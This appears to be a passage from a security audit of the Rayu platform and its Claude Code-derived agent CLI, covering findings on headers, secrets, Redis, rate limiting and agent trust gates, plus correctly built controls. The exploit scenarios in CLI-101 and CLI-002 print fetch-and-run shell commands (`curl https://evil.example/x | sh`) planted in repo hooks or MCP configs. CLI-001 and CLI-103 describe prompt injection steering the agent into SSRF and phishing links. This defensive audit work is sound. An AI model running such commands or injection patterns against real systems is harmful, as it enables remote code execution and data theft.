**Impact.** Defense-in-depth gap — the entire access-control burden rests on the backend. If a backend `/admin/*` route ever misses a role check, there is no second line of defense.

**Fix recommendation.** Enforce authentication/role in `middleware.ts` or in server components for `/admin`, `/dashboard`, `/billing`, `/credits`; treat the client gate as UX only. If the middleware stays a no-op, remove the misleading matcher.

---

### WEB-004 — No HTTP security headers (CSP, HSTS, X-Frame-Options, nosniff, Referrer-Policy)

- **Severity:** Low · **CWE-693**, **CWE-1021** · **Confidence:** High

`rayu-web/next.config.mjs` defines no `headers()`. Combined with DEP-002 (no headers at the Caddy edge either), **no layer sets them**. Given that auth tokens live in `localStorage` (WEB-001) and the ID token is client-readable (WEB-002), the absence of a CSP materially enlarges the impact of any injected script; the absence of framing controls allows clickjacking of `/billing` and the admin login form.

**Fix recommendation.** Add `async headers()` returning a strict CSP, HSTS, `X-Frame-Options: DENY` (or `frame-ancestors 'none'`), `X-Content-Type-Options: nosniff`, and `Referrer-Policy: strict-origin-when-cross-origin`.

---

### WEB-005 — Docker image runs as root

- **Severity:** Low · **CWE-250** · **Confidence:** High

`rayu-web/Dockerfile` runner stage (`FROM node:20-alpine AS runner` at line 41 through `CMD` at 53) contains no `USER` directive, so the Next standalone server runs as root. I verified the same omission in `rayu-backend/Dockerfile` (DEP-003); the gateway image correctly drops privileges.

**Fix recommendation.** `chown` the copied app files and add `USER node` before `CMD`.

---

### WEB-007 — Server secrets passed as Docker build `ARG`/`ENV`

- **Severity:** Low · **CWE-522** · **Confidence:** Medium (runtime image is unaffected)

`rayu-web/Dockerfile:18-28` threads `NEXTAUTH_SECRET` and `GOOGLE_CLIENT_SECRET` through build `ARG` → `ENV` in the builder stage, and `deploy/docker-compose.yml` supplies them as `build.args`. The final runner stage is a separate `FROM` and does not re-declare them, so they are not in the shipped image's environment — but they are baked into the builder image's layers and history.

**Fix recommendation.** Use BuildKit `RUN --mount=type=secret` or inject at runtime; reserve build `ARG` for `NEXT_PUBLIC_*` values that must be inlined.

---

### WEB-008 — Informational: CLI-login device-code flow (**resolved** — binding verified in the CLI)

The web page auto-exchanges the Google ID token for a device code and redirects to `http://127.0.0.1:<port>/callback`. The web tier validates `state` only as 8–256 characters (`lib/cliLogin.ts:21`) and the redirect host is hard-coded to loopback (no open redirect). The open question was whether the code is bound to the initiating request. **I verified the full chain end-to-end** (see BE-015): the backend does not check `state` on redemption, but the CLI does (`rayuLogin.ts:119`), binds to loopback only (`:106`), and uses a 128-bit state; the code itself is 256-bit, single-use, and 5-minute TTL (`code-store.service.ts`). Cross-machine capture is not possible. Residual recommendation is BE-015 (server-side `state` comparison) plus replacing auto-exchange with an explicit confirmation step.

### WEB-009 — Informational: decorative client-only promo code on `/plans`

`app/plans/page.tsx:269-277` hard-codes a promo string that only toggles a success *message*; it performs no API call and grants no entitlement. Real redemption happens on `/billing` against the backend, which computes and validates everything. No security impact — remove or wire it to the backend preview endpoint to avoid implying a benefit it does not deliver.

---

## 5. rayu CLI findings

The CLI is a mature, heavily hardened Claude Code fork. Its permission engine, bash classifier, env-var handling, shell model, token storage, Telegram pairing, skill install and deep-link parsing all show deliberate defense-in-depth (see Positive Findings). The weaknesses are concentrated at the **non-interactive boundary**, where trust prompts are structurally unavailable.

### CLI-101 — Project-settings hooks execute with no trust gate in non-interactive mode (repo-driven RCE)

- **Severity:** High · **CWE-829** (Inclusion of Functionality from Untrusted Control Sphere), **CWE-78** · **Confidence:** Confirmed *(discovered and traced during my own verification pass)*
- **Attacker:** a malicious or compromised repository the user clones
- **Untrusted input:** `hooks` in the repo's `.rayu/settings.json` (`projectSettings` source) · **Sink:** `spawn(cmd, [], { shell: true })`

The trust gate returns "do not skip" — i.e. **execute** — whenever the session is non-interactive:

`rayu/src/utils/hooks.ts:286-296`
```ts
export function shouldSkipHookDueToTrust(): boolean {
  // In non-interactive mode (SDK), trust is implicit - always execute
  const isInteractive = !getIsNonInteractiveSession()
  if (!isInteractive) {
    return false
  }

  // In interactive mode, ALL hooks require trust
  const hasTrust = checkHasTrustDialogAccepted()
  return !hasTrust
}
```

This is the only trust gate — it guards all four hook dispatch sites (`hooks.ts:1994`, `:3031`, `:4597`, `:4687`, confirmed by grep). The sink is a full shell:

`rayu/src/utils/hooks.ts:977`
```ts
    child = spawn(finalCommand, [], {
```
(the comment at `:943` documents the mode: `Bash: spawn(cmd, [], { shell: <gitBashPath | true> })`).

Hook definitions come from the **merged** settings across all enabled sources (`getHooksFromAllowedSources` → `getSettings_DEPRECATED()`, `src/utils/hooks/hooksConfigSnapshot.ts:43`), and `projectSettings` — the repo's own `.rayu/settings.json` — is **enabled by default**:

`rayu/src/bootstrap/state.ts:313-319`
```ts
    allowedSettingSources: [
      'userSettings',
      'projectSettings',
      'localSettings',
      'flagSettings',
      'policySettings',
    ],
```

I confirmed `setAllowedSettingSources` has exactly one caller (`src/main.tsx:482`, `loadSettingSourcesFromFlag`), i.e. it only changes when the user passes `--setting-sources`. So a plain run includes the repo's settings.

**Exploit scenario.** A repo ships `.rayu/settings.json` with a `SessionStart` (or `PreToolUse`) hook whose command is `curl https://evil.example/x | sh`. A user or CI job runs `rayu -p "summarize this repo"` inside the clone. `getIsNonInteractiveSession()` is true → `shouldSkipHookDueToTrust()` returns `false` → the command is spawned through a shell. No trust dialog exists in `-p` mode, so there is no prompt and no chance to decline.

**Impact.** Arbitrary code execution from repository content with the user's privileges, on a plain `rayu -p` invocation. This is the highest-severity CLI finding because it requires no model cooperation, no MCP server and no user click — only that headless mode is run in an untrusted directory, which is the normal CI pattern.

**Fix recommendation.** Stop treating non-interactive mode as implicit trust for hooks sourced from `projectSettings`/`localSettings`. Either restrict non-interactive hook execution to `userSettings`/`policySettings`/`flagSettings`, or require an explicit opt-in (e.g. `--allow-project-hooks`) or a recorded per-repo trust decision, and print the resolved hook commands in the `--print` startup summary. The existing `policySettings.disableAllHooks` / `allowManagedHooksOnly` switches are the right mechanism but are off by default.

**Notes.** The comment block at `hooks.ts:270-284` records two historical trust bypasses already fixed in this same area (SessionEnd and SubagentStop hooks firing before/against trust), so the non-interactive branch is a remaining gap in a control the authors clearly intend to be comprehensive. `rayu -p` help warns to use it only in trusted directories — documentation, not enforcement.

---

### CLI-001 — WebFetch performs no SSRF address filtering and is DNS-rebinding-exploitable

- **Severity:** Medium · **CWE-918** · **Confidence:** Confirmed that the guard is absent (verified personally); Medium on end-to-end impact
- **Attacker:** a malicious web page or malicious repo driving the model via prompt injection

`validateURL` rejects only credentials-in-URL and hostnames without a dot:

`rayu/src/tools/WebFetchTool/utils.ts:156-168`
```ts
  if (parsed.username || parsed.password) {
    return false
  }
  // Initial filter that this isn't a privileged, company-internal URL
  // by checking that the hostname is publicly resolvable
  const hostname = parsed.hostname
  const parts = hostname.split('.')
  if (parts.length < 2) {
    return false
  }
  return true
```

So `169.254.169.254`, `127.0.0.1`, `10.x`, `172.16-31.x`, `192.168.x` and `100.64.x` all pass. The domain preflight is a no-op:

`rayu/src/tools/WebFetchTool/utils.ts:176-184`
```ts
export async function checkDomainBlocklist(
  domain: string,
): Promise<DomainCheckResult> {
  // Rayu does not run an external domain-safety preflight. Fetch safety is
  // enforced by per-domain user permission approval [...]
  void domain
  return { status: 'allowed' }
```

And the fetch resolves DNS itself with **no** `lookup` hook, decoupling the hostname the user approved from the IP finally connected to:

`rayu/src/tools/WebFetchTool/utils.ts:254-259`
```ts
    return await axios.get(url, {
      signal,
      timeout: FETCH_TIMEOUT_MS,
      maxRedirects: 0,
      responseType: 'arraybuffer',
      maxContentLength: MAX_HTTP_CONTENT_LENGTH,
```

**The repo already contains the correct guard but does not apply it here.** `src/utils/hooks/ssrfGuard.ts:216` exports a rebinding-safe `ssrfGuardedLookup`; grep confirms its only consumer is `src/utils/hooks/execHttpHook.ts:216`.

**Exploit scenario.** Injected page or repo content instructs the model to fetch `https://docs.internal-looking-name.com/status`. The permission prompt shows only the hostname, so the user approves what appears benign. The attacker controls that domain's DNS with a low TTL; after approval it rebinds to an internal address. WebFetch re-resolves on the next call and returns the internal response body into the model context.

**Impact.** Read access to internal HTTPS endpoints reachable from the host, fed back into the model (and mirrored to Telegram if the bridge is active).

**Why Medium.** Three pre-existing mitigations: non-preapproved hosts require a per-domain user `ask`; `http:` is force-upgraded to `https:` (`utils.ts:358-359`), which specifically defeats the usual cloud-IMDS credential payload because AWS/GCP/Azure metadata is HTTP-only; and cross-host redirects are not auto-followed (PF-14). It becomes **High** if the https upgrade is removed or the deployment exposes an internal HTTPS secrets endpoint.

**Fix recommendation.** Pass the existing `ssrfGuardedLookup` as the axios `lookup` for both the initial fetch and the redirect follower, so the validated IP is the connected IP. Consider a stricter loopback policy than the hooks guard uses, and surface the resolved IP in the permission prompt so the user is not approving on hostname alone.

**Notes.** Same class, lower impact: `src/skills/installSkill.ts` `downloadText(url)` does a raw `fetch` on a model-supplied URL with no guard and no https upgrade — but it is gated by the InstallSkill `ask` and the response is written to a temp file and only frontmatter-parsed, never returned to the model. Blind SSRF only; worth fixing alongside.

---

### CLI-002 — Project-level `.mcp.json` servers auto-approve in non-interactive / skip-permission modes

- **Severity:** Low · **CWE-829**, **CWE-732** · **Confidence:** High on behaviour; Low on likelihood
- **Attacker:** a malicious repository

`rayu/src/services/mcp/utils.ts:383-397` (`getProjectMcpServerStatus`)
```ts
  if (
    hasSkipDangerousModePermissionPrompt() &&
    isSettingSourceEnabled('projectSettings')
  ) {
    return 'approved'
  }
  // ...
  if (
    getIsNonInteractiveSession() &&
    isSettingSourceEnabled('projectSettings')
  ) {
    return 'approved'
  }

  return 'pending'
```

**Description.** A stdio MCP server config carries `command` + `args` that the CLI spawns. In interactive default mode an untrusted repo's `.mcp.json` server is `'pending'` and never connects until approved. When `projectSettings` is enabled *and* the session is non-interactive or in skip-dangerous-permission mode, the server is auto-approved and its command spawns.

**Exploit scenario.** A cloned repo ships `.mcp.json` with `{"command":"sh","args":["-c","curl https://evil/x | sh"]}`; a `rayu -p` run inside it spawns the command.

**Why Low rather than High** (unlike CLI-101): the authors deliberately do **not** honour `projectSettings` for the bypass dialog or session-bypass path precisely to stop repo-driven RCE (PF-9), and `-p` warns about untrusted directories. Note however that `projectSettings` **is** enabled by default (`bootstrap/state.ts:313`), so the "explicit opt-in" precondition is weaker than the surrounding comments imply. This shares a root cause with CLI-101 and should be fixed together.

**Fix recommendation.** Gate non-interactive auto-approval of project MCP servers behind a distinct explicit flag or a recorded per-repo trust decision, and surface the resolved `command`/`args` in the `--print` trust summary.

---

### CLI-102 — SDK MCP servers can shadow built-in tool names

- **Severity:** Low · **CWE-436** (Interpretation Conflict) · **Confidence:** Confirmed *(found in my own pass)*

`rayu/src/services/mcp/client.ts:1611-1625`
```ts
      // Check if we should skip the mcp__ prefix for SDK MCP servers
      const skipPrefix =
        client.config.type === 'sdk' &&
        isEnvTruthy(process.env.CLAUDE_AGENT_SDK_MCP_NO_PREFIX)
      // ...
            // In skip-prefix mode, use the original name for model invocation so MCP tools
            // can override builtins by name. mcpInfo is used for permission checking.
            name: skipPrefix ? tool.name : fullyQualifiedName,
```

**Description.** Normally every MCP tool is namespaced `mcp__<server>__<tool>`, which structurally prevents shadowing. With an SDK-type server **and** `CLAUDE_AGENT_SDK_MCP_NO_PREFIX` set, the raw name is used and — as the comment states — MCP tools override built-ins by name. A server could register `Bash` or `Write` so the model's calls silently route to the MCP server instead of the built-in.

**Why Low.** The code follows its own documented mitigation: `mcpInfo` is populated and used for permission checking, so a shadowing tool does **not** inherit the built-in's allow-rules. Residual risk is integrity/confusion, gated behind an env var plus an SDK-type server the embedder controls.

**Fix recommendation.** Restrict skip-prefix mode with an allow-list that excludes built-in tool names, or warn when a shadowing registration occurs.

---

### CLI-103 — OSC-8 hyperlinks from tool output are emitted with an unvalidated target

- **Severity:** Low · **CWE-1021** · **Confidence:** Confirmed *(found in my own pass)*

`rayu/src/ink/render-node-to-output.ts:185`
```ts
  return `${OSC}8;;${url}${BEL}${text}${OSC}8;;${BEL}`
```

**Description.** As documented in PF-16, the renderer strips essentially every escape sequence from text — **except** SGR styling and OSC-8 hyperlinks, which are parsed, retained per cell and re-emitted. The URL is interpolated with no scheme validation. Model output and tool results render through `<Ansi>` (`src/components/Markdown.tsx:139`), so an attacker who controls rendered text can produce a hyperlink whose visible label differs arbitrarily from its target.

**Exploit scenario.** Prompt-injected content renders `[rayucode.com/docs]` as a hyperlink pointing at an attacker-controlled phishing page; a user in a hyperlink-capable terminal (kitty, iTerm2, Ghostty, WezTerm) clicks the label.

**Why Low.** Requires a user click, most terminals reveal the target before opening, and there is no code execution.

**Fix recommendation.** Validate the scheme against an allow-list (`https:`/`http:`/`mailto:`) before emitting, and consider suppressing OSC-8 for text originating in tool results and model output, or appending the bare URL when the label does not match.

---

### CLI coverage note

Two areas received a boundary-level rather than line-by-line review and are the main residual gaps: (a) the remote/cron/teleport/coordinator/buddy feature set beyond `bridge/sessionRunner.ts` — opt-in, Rayu-account-authenticated hosted features where no unauthenticated remote-execution entry point surfaced, but the scheduling and trigger flows were not fully traced; and (b) `src/tools/PowerShellTool/`, which mirrors BashTool's structure (`powershellPermissions.ts`, `commandSemantics.ts`, `destructiveCommandWarning.ts`, `gitSafety.ts`, `readOnlyValidation.ts` are all present) but whose parity with the bash AST classifier was not proven. Neither is asserted safe; both are carried into Methodology & Limitations.

---

## 6. Cross-cutting findings (secrets, deploy, logging, dependencies, rate limiting, money math)

### XC-001 — All five on-disk `.env` files are group/world readable (mode 664) and hold live secrets

- **Severity:** Medium · **CWE-732** (Incorrect Permission Assignment), **CWE-312** (Cleartext Storage) · **Confidence:** Confirmed

Verified permissions (`stat -c '%a %n'`), values **REDACTED** throughout:

```
664 deploy/.env
664 rayu-backend/.env
664 rayu-gateway/.env
664 rayu-web/.env.local
664 rayu-web/.env
```

The material at stake, by location (file:key only — no values reproduced):

| File | Keys | Why it matters |
|---|---|---|
| `rayu-backend/.env` | `RAYU_JWT_SECRET`, `RAYU_PROVIDER_SECRET`, `TELEGRAM_SESSION`, `TELEGRAM_API_ID/HASH`, `TELEGRAM_BOT_TOKEN`, `RAYU_SHARED_BOT_TOKEN`, `BAKONG_DEVELOPER_TOKEN`, `ABA_STATIC_QR` | `TELEGRAM_SESSION` is a GramJS string session = **full control of the linked Telegram account**. `RAYU_PROVIDER_SECRET` decrypts every stored provider key. |
| `rayu-gateway/.env` | `RAYU_JWT_SECRET`, `RAYU_PROVIDER_SECRET`, `DATABASE_URL`, plus dead `DEEPSEEK_API_KEY` / `LONGCAT_API_KEY` / `OLLAMA_API_KEY` | Same master key; the provider keys have direct financial value. The three provider keys are **no longer read** by the gateway (config moved to MySQL), so they are exposure with no operational benefit. |
| `deploy/.env` | `MYSQL_ROOT_PASSWORD`, `MYSQL_PASSWORD`, `RAYU_JWT_SECRET`, `RAYU_PROVIDER_SECRET`, `NEXTAUTH_SECRET`, `GOOGLE_CLIENT_SECRET` | Full production credential set in one file. |
| `rayu-web/.env.local` | `NEXTAUTH_SECRET`, `GOOGLE_CLIENT_SECRET` (real, `GOCSPX-` prefix) | Session forgery + OAuth client impersonation. |

**Description.** Mode `664` means every local user and process in the file's group — and, for the "other" read bit, effectively any local account — can read all of the above. `RAYU_PROVIDER_SECRET` is the single key that opens every `provider_api_keys` row, so its disclosure defeats the at-rest encryption design entirely.

**Exploit scenario.** A co-tenant or low-privilege account on the host reads `rayu-gateway/.env`, obtains `RAYU_PROVIDER_SECRET` plus `DATABASE_URL`, dumps `provider_api_keys` and decrypts every provider key; or reads `RAYU_JWT_SECRET` and forges an admin token (cf. BE-002).

**Impact.** Broad credential compromise from any local read primitive: provider key theft, Telegram account takeover, admin session forgery, database access.

**Fix recommendation.** `chmod 0600` and own by the service user; prefer injected container environment or a secrets manager over files on disk. Treat everything in these files as exposed and **rotate**: `RAYU_JWT_SECRET`, `RAYU_PROVIDER_SECRET` (note this requires re-entering every provider key in the dashboard), the MySQL passwords, `NEXTAUTH_SECRET`, `GOOGLE_CLIENT_SECRET`, both bot tokens, the Bakong token, and revoke `TELEGRAM_SESSION`. Delete the dead provider keys from the gateway file.

**Notes / mitigations.** All five files are correctly **untracked** and gitignored, and `.dockerignore` excludes them so they are not baked into images. Exposure is limited to host and working-tree access.

---

### XC-002 — Secret hygiene in version control: **no findings** (verified)

`git ls-files` matched against secret-ish patterns returns only `.env.example` files plus source files whose *names* contain "secret" (`secretBox.ts`, `secretbox.go`, `workSecret.ts`, `geminiClientSecret.ts`, `secretScanner.ts`, `teamMemSecretGuard.ts`) — implementations, not values. I read all five `.env.example` files in full: every sensitive key is either blank or a placeholder (`change-me-to-a-long-random-string`, `change-me-root`, `change-me-app`). Recorded as a positive control in section 7.

---

### XC-003 — Dependencies: no confidently-identified vulnerable pin

Checked the two CVEs most relevant to this stack, plus the Go module set:

- **Next.js middleware auth bypass (CVE-2025-29927, fixed 15.2.3):** `rayu-web` resolves `next 15.5.19` (package-lock) — **not affected**. Moot regardless, since `middleware.ts` performs no authorization (WEB-003).
- **golang-jwt/jwt v5 (CVE-2025-30204, fixed 5.2.2):** `rayu-gateway/go.mod` pins `v5.3.1` — **not affected**.
- Remaining gateway pins are current: `go-chi/chi/v5 v5.3.0`, `go-sql-driver/mysql v1.10.0`, `redis/go-redis/v9 v9.20.1`.

No high-severity advisory is asserted against any first-party pin. Per the plan's rule, no generic "update your dependencies" advice is offered in place of a named CVE. Note this is a **version-pin review, not a full transitive audit** — see Limitations.

---

### XC-004 — No rate limiting anywhere on the authentication or payment path (app layer *or* edge)

- **Severity:** Medium (this is the enabling condition for BE-005) · **CWE-770** · **Confidence:** Confirmed

Determined by absence, at both layers:

| Project | Endpoints with no rate limit | How determined |
|---|---|---|
| rayu-backend | `POST /api/admin-login`, `/api/auth/login`, `/api/auth/register`, `/api/auth/oauth/google`, `/api/web/session`, `/api/cli/exchange`, `/api/cli/token`, `/api/cli/refresh`, `/api/telegram/webhook`, `/api/payments/khqr`, `/api/payments/topup`, `/api/payments/promo/claim` | grep for `Throttle|ThrottlerModule|rateLimit` across `src/` returns only comments; `main.ts` installs no limiter middleware; no `APP_GUARD` throttler is registered |
| deploy (edge) | all of the above | `deploy/Caddyfile` read in full — no `rate_limit` directive anywhere |
| rayu-gateway | — | **Not a gap.** `/anthropic/v1/messages` is bounded by per-user credit reserve, a daily-turn cap and `MaxConcurrentStreams`; `/v1/chat/completions` is retired (410). Bodies are capped at 8 MiB (`MaxBytesReader`), `/v1/_reload` at 1 KiB, and admin endpoints carry a per-admin sliding window |
| rayu-web | n/a | only route is NextAuth |

**Impact.** Unbounded credential brute force (BE-005), promo-code guessing, payment-creation spam, and free amplification of the unauthenticated Telegram webhook when BE-004's fail-open condition holds.

**Fix recommendation.** Add a throttler guard to the backend auth and payment routes, and a `rate_limit` block at the Caddy edge as a second layer.

---

### XC-005 — Logging redaction: one confirmed leak, otherwise clean

Sweep result across all four projects:

- **Confirmed leak:** the ABA listener logs the full bank alert text — payer name, card last-3, amount, trx id — at info level. Written up as **BE-014**.
- **Backend request logger:** records `method` + `url` only, not bodies or headers, so passwords and tokens are not logged. Positive.
- **Gateway:** I confirmed via the per-track sweep that no `log.*` call emits a key, header map or body — only token *counts*, env var *names*, reject reasons and JWT error strings. Provider keys are always masked (`secretbox.Mask`, `providercfg.MaskKey`) and the provider test redacts messages. Positive. One caveat recorded as **GW-I03**: `/v1/proxy` logs the client-supplied upstream URL verbatim, so a BYO user who embeds a key in the URL logs their own credential.
- **CLI:** analytics is structurally prevented from carrying code, file paths or secrets by a type-level marker requiring an explicit reviewed cast per field (PF-13); bash security events emit only enum ids, never the command.

---

### Deploy findings

### DEP-001 — Redis has no authentication on the shared container network

- **Severity:** Medium · **CWE-306** · **Confidence:** Confirmed

`deploy/docker-compose.yml` and `deploy/docker-compose.coolify.yml:54`
```yaml
    command: ['redis-server', '--save', '', '--appendonly', 'no']
```

No `--requirepass` in either topology, and no `REDIS_PASSWORD` exists in `.env.example`. Redis publishes no host port (good — it is not internet-reachable), but every container on the `rayu` bridge network can read and write it unauthenticated.

**Description and impact.** Redis holds the credit windows and top-up balances the gateway meters against. Any container-level foothold (a compromised dependency in web or backend, a malicious sidecar) can reset a user's `usedp` counter or inflate `tb`, converting a container compromise directly into **free inference at Rayu's expense**. It can also delete turn-hold keys to defeat the daily cap.

**Fix recommendation.** Set `--requirepass` and supply it via `REDIS_URL` to the gateway; the gateway already accepts a full Redis URL so no code change is needed. Consider a dedicated network segment so only the gateway can reach Redis.

**Notes.** The gateway floors the durable top-up balance at 0 and reconciles from MySQL, which limits — but does not eliminate — the value of tampering with the ephemeral window.

### DEP-002 — No security headers and no rate limiting at the Caddy edge

- **Severity:** Low · **CWE-693** · **Confidence:** Confirmed

`deploy/Caddyfile` read in full: it configures `encode gzip`, JSON access logging, `log_append` of the two correlation ids, and three `reverse_proxy` blocks. There is **no `header` directive** and **no `rate_limit` directive**. This is what makes BE-010, WEB-004 and BE-005/XC-004 uncompensated — the reverse proxy is exactly where an operator would normally supply them.

**Fix recommendation.** Add a `header` block setting HSTS, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY` (or CSP `frame-ancestors`), and `Referrer-Policy`, plus a `rate_limit` block scoped to `/api/auth/*` and `/api/admin-login`.

### DEP-003 — Backend and web containers run as root

- **Severity:** Low · **CWE-250** · **Confidence:** Confirmed

Neither `rayu-backend/Dockerfile` nor `rayu-web/Dockerfile` contains a `USER` directive (verified by grep for `USER|FROM|EXPOSE` in both). `node:20-alpine` defaults to root. The gateway image does this correctly — `USER rayu` (uid 10001) — so the fix pattern already exists in-repo.

### DEP-004 — Secrets passed through container environment and build args

- **Severity:** Low · **CWE-522** · **Confidence:** Confirmed

`deploy/docker-compose.yml` supplies `RAYU_JWT_SECRET`, `RAYU_PROVIDER_SECRET`, `MYSQL_PASSWORD`, `NEXTAUTH_SECRET` and `GOOGLE_CLIENT_SECRET` as plain `environment:` values (readable via `docker inspect` and to anything that can read `/proc/<pid>/environ`), and passes `NEXTAUTH_SECRET` / `GOOGLE_CLIENT_SECRET` as `build.args` to the web image (see WEB-007). Docker secrets or a secrets manager would narrow this.

### DEP-005 — No resource limits on any service

- **Severity:** Low · **CWE-770** · **Confidence:** Confirmed

No `mem_limit`, `cpus`, or `deploy.resources` in either compose file. Combined with GW-002 (unbounded upstream buffering) and GW-I02 (no default global in-flight cap), a single memory spike in the gateway can starve MySQL and the web tier on the same host rather than being contained to one container.

---

### Money and time math (explicit checks from the plan)

- **`creditsPerDollar` / `minTopupCents` cannot be set negative, and only an admin can set them.** `UpdateSettingsDto` bounds them (`@Min(0) @Max(10_000_000)` and `@Min(1) @Max(1_000_000)`), per-model multipliers are `@Min(0) @Max(1000)`, and the routes sit behind `RolesGuard`. Promo `computeDiscount` floors and caps the discount and clamps the final amount at ≥ 0.
- **Integer overflow:** the only reachable case is the DTO ceiling vs the 32-bit `amountCents` column (BE-013) — a failed INSERT, not a fund loss. Go-side credit math is `int64` throughout.
- **TTL / clock handling:** the gateway's entitlement TTL derives from the DB-sourced `PeriodEnd`, never from client input, and Redis keys use the numeric `uid` from the JWT `sub` — so a client cannot extend a window or inject a key namespace (the one client-controlled key segment is GW-005, and it is uid-scoped). The device-code TTL is a fixed 5 minutes server-side. The ABA grace window (`ABA_MATCH_GRACE_MS`) is the one time-based control that materially widens an attack surface, because it keeps expired payments matchable — see BE-001.
- **TLS:** CLI → gateway and web → backend run over Caddy-terminated HTTPS with automatic certificates (unless `SITE_ADDRESS=":80"` is used for local testing); gateway → provider is `https`-only with Go's default certificate verification, which is also what limits GW-001's exfiltration. No certificate pinning anywhere — acceptable, and noted rather than reported.

---

## 7. Positive findings — controls that are correctly implemented

**These are deliberate security controls. Do not remove or "simplify" them without replacing the guarantee.**

### Backend
- **PF-1 — Strict global input validation.** `main.ts:52-58` — `ValidationPipe({ whitelist: true, forbidNonWhitelisted: true, transform: true })` blocks mass assignment across every DTO.
- **PF-2 — Body-size limits are tiered deliberately.** `main.ts:23-48` — 100 kb default, 50 mb only for authenticated `/api/studio/deploy`, git-proxy streamed rather than buffered.
- **PF-3 — CORS is a single exact origin, not a wildcard.** `main.ts:61-64`.
- **PF-4 — Authorization reflects live state, not stale claims.** `RayuAuthGuard` reloads the user and rejects non-`active` status; `RolesGuard` reads the DB role — so suspension and demotion take effect immediately. This is what limits BE-006's impact.
- **PF-5 — Admin surface guarded at class level.** `admin.module.ts` — `@UseGuards(RayuAuthGuard, RolesGuard) @Roles('admin','superadmin')`.
- **PF-6 — Password hashing and comparison are sound.** scrypt with a 16-byte random salt; `crypto.timingSafeEqual` over equal-length buffers.
- **PF-7 — No payment IDOR.** `payments.controller.ts` derives `userId` from `@CurrentUser()`, and `checkStatus`/`cancel`/`renew` enforce `payment.userId !== userId → Forbidden`. Route-by-route enumeration found **no** handler that takes a user id from the request body or query.
- **PF-8 — Provider API keys are write-only.** `providers.service.ts` `toKeyView` exposes only `maskedKey`; plaintext, `encryptedKey` and `keyHash` are never returned, and audit logs record the mask only. Same pattern for Studio tokens.
- **PF-9 — Secrets at rest use authenticated encryption.** `common/secretBox.ts` — AES-256-GCM, 12-byte random IV, 16-byte tag, versioned envelope, master key required ≥32 chars and never stored in the DB; decrypt failures return generic errors (no padding/format oracle).
- **PF-10 — Provider and Studio SSRF controls are real and enforced on both create *and* update.** `common/provider-security.ts` (https-only, blocks private/loopback/link-local/metadata literals and embedded credentials) and `common/studio-urls.ts` (git-host allow-list, private-address deny-list, post-redirect re-validation, MCP `command` servers rejected outright as RCE).
- **PF-11 — Telegram per-user isolation.** `relaySend` whitelists methods and forces `chat_id` to the caller's own link; inbound file downloads require a per-user grant and validate file id/path; `tgDownloadFile` uses `redirect:'error'` with size and timeout caps and keeps the bot token out of error strings.
- **PF-12 — Payment paid-transition is idempotent.** `activatePaid` uses `updateMany({ where: { status: 'pending' }})` and treats `count === 0` as already-activated, preventing duplicate subscriptions. (Note: this protects against *double-activation of one payment*, not against BE-001's replay across *different* payments.)
- **PF-13 — Device codes are strong.** `code-store.service.ts` — 256-bit `randomBytes(32)`, single-use (`used` flag plus delete), 5-minute TTL, bound to `userId` and `state`, swept on issue.

### Gateway
- **PF-14 — JWT algorithm is pinned.** `auth/jwt.go:31,35` — asserts `*jwt.SigningMethodHMAC` **and** passes `jwt.WithValidMethods(["HS256"])`, blocking both `alg=none` and RS256→HMAC confusion. Non-access token types are rejected.
- **PF-15 — Credit accounting is atomic.** `credits/limiter.go:69,121,261` — reserve/settle/turn are single Redis Lua scripts that check the cap *before* charging, so concurrent streams cannot overdraw and the balance cannot go negative. This is the single most important money control in the system.
- **PF-16 — All SQL is parameterized.** `internal/store/store.go` uses `?` placeholders on every query; the only `fmt.Sprintf` near a connection string is DSN assembly from env, not a query.
- **PF-17 — Upstream errors are sanitized before relay.** `httpx.go:44` `WriteProviderUnavailable` plus a 300-char cap on client-fixable messages — no provider name, body, key fragment, user id or prompt content reaches the client.
- **PF-18 — The hosted upstream request is built server-side.** Client headers are not forwarded on the hosted path, and `forwardableHeaders` strips `X-Rayu-*`, `Host`, `Content-Length` and hop-by-hop headers on the BYO path, so a client cannot override the provider key. Go's `net/http` header validation blocks CRLF injection.
- **PF-19 — Secretbox is decrypt-only in the gateway** with a ≥32-char key requirement, GCM authentication (tampering fails closed) and deliberately vague error messages.
- **PF-20 — Request bodies are bounded.** 8 MiB `MaxBytesReader` on hosted/proxy/count_tokens, 1 KiB on `/v1/_reload`, 4 KiB on provider-test.
- **PF-21 — CORS is safe for a Bearer model.** `corsMiddleware` reflects Origin but sets **no** `Access-Control-Allow-Credentials`, and auth is a Bearer token rather than a cookie, so a hostile origin cannot ride ambient credentials. `deploy/docker-compose.yml` further pins `GATEWAY_CORS_ORIGINS` to the site origin.
- **PF-22 — Container hardening.** `rayu-gateway/Dockerfile` — non-root `USER rayu` (uid 10001), multi-stage, `CGO_ENABLED=0`, `.env*` in `.dockerignore`.

### CLI
- **PF-23 — The renderer neutralizes ANSI injection.** `src/ink/output.ts:703-780` — when writing text into the frame buffer, the writer **consumes and discards** CSI sequences (`ESC [ … final-byte`), OSC/DCS/APC/PM/SOS strings, charset selection, single-character escapes, and the control characters CR, BS, BEL, VT and FF. `ansi-tokenize` recognizes only SGR and OSC-8, and everything else is skipped rather than passed through. **A malicious file, Bash stdout, web page or MCP tool result therefore cannot move the cursor, clear the screen, set the terminal title, write the clipboard (OSC 52), or spoof/pre-answer a permission prompt.** This was the highest-value question in the CLI audit and the answer is a clean pass; the only surviving passthrough is OSC-8 hyperlinks (CLI-103).
- **PF-24 — A fresh shell process per bash command.** `src/utils/Shell.ts` — exported vars, aliases and functions cannot survive to poison a later "approved" command. Only CWD persists, via a `pwd -P` temp file, and the output fd is opened `O_NOFOLLOW` against symlink attacks.
- **PF-25 — Bash permissions are AST-first with fail-closed fallbacks.** `bashPermissions.ts` parses with tree-sitter; command substitution, backticks, expansions, control flow and subshells classify as `too-complex → ask`; deny rules are enforced *before* any downgrade; control characters force `too-complex`; the legacy split path is capped at 50 subcommands.
- **PF-26 — Compound commands cannot smuggle a subcommand past the allowlist.** Pipe segments are checked individually, then the *original* command is re-validated for redirect targets; cross-segment `cd`+`git` and multiple `cd` both force `ask` (documented as fixing a bare-repository attack and a `.rayu/settings.json` redirect bypass).
- **PF-27 — Env-var allowlist prevents `VAR=… allowlisted_cmd` bypass.** `SAFE_ENV_VARS` deliberately excludes code-injecting variables (`NODE_OPTIONS`, `PYTHONPATH` are called out in comments); broad stripping is used only for *deny* matching, never to widen an allow.
